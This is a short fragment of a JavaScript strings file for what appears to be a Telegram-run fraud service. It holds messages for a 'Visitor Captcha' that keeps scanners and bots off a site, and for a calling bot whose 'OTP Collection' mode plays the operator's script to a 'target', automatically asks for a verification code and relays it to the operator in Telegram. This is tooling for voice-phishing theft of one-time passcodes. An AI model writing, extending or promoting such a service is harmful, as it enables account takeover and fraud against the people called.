...
Service delivered.`,
 ...
 antiRedStatusOff: domain => `🛡️ <b>Visitor Captcha</b> for <b>${domain}</b>\n\nStatus: <b>❌ OFF</b>\n\nVisitors reach your site directly with no challenge. Bots and scanners are NOT blocked at the edge.\n\n⚠️ <b>Recommendation:</b> Turn it ON for maximum security.`,
 ...
 cp_41: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>OTP Collection</b> — Target hears your script, presses the key, then is automatically prompted to enter a verification code. You confirm/reject the code via Telegram\\n\\nBoth modes report full results.',
 ...
 cp_77: '🔑 <b>OTP Collection Mode</b>\\n\\nHow many digits should the code be?\\n\\n💡 <b>How it works:</b> Your script plays first → caller presses the active key → system automatically says <i>"Please enter your [X]-digit verification code followed by the pound key"</i> → you receive the code in Telegram to confirm or reject.\\n\\n<b>You do NOT need to mention the code prompt in your script</b> — it is added automatically.\\n\\n<i>Default: 6 digits</i>',
 cp_78: 'Select a mode:',
